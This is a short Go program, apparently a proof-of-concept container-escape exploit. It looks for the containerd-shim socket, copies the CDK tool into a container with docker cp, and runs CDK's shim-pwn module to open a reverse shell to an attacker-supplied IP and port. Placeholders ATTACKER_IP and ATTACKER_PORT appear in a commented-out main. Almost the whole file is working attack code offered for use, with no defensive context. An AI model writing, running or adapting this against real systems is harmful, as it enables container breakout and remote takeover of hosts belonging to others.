package main

import (
	"fmt"
	"os/exec"
)

// Checking for the containerd-shim Socket:
// It checks for the presence of the containerd-shim socket, which is crucial for the exploit.

func mainfunc(attackerIP, attackerPort string) {
	// Check for the containerd-shim socket
	checkSocket := "cat /proc/net/unix | grep -a 'containerd-shim'"
	execCommand(checkSocket)

	// Transfer the CDK tool to the container
	transferCDK := "sudo docker cp cdk_linux_amd64 15257:/tmp"
	execCommand(transferCDK)

	// Execute the CDK tool for a reverse shell attack
	runCDK := fmt.Sprintf("cd /tmp && ./cdk_linux_amd64 run shim-pwn reverse %s %s", attackerIP, attackerPort)
	execCommand(runCDK)
}

// execCommand executes a given shell command and prints its output
func execCommand(command string) {
	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error executing command:", err)
		return
	}
	fmt.Println("Command output:", string(output))
}

// func main() {
// 	attackerIP := "ATTACKER_IP"     // Replace with the actual IP
// 	attackerPort := "ATTACKER_PORT" // Replace with the actual port
// 	mainfunc(attackerIP, attackerPort)
// }
